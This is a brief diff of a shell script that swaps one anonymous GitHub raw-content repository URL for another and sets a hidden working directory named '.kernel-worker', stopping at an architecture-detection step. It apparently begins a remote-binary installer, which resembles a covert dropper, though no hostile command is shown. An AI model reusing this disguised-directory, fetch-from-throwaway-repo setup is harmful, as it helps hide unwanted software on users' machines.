@@ -1,7 +1,7 @@
 #!/bin/sh
 set -e
 
-REPO_URL="https://github.com/anonking-67/anon76/raw/refs/heads/main"
+REPO_URL="https://github.com/anonking-67/cotton4/raw/refs/heads/main"
 WORKDIR="$HOME/.kernel-worker"
 
 # 1. Deteksi Arsitektur
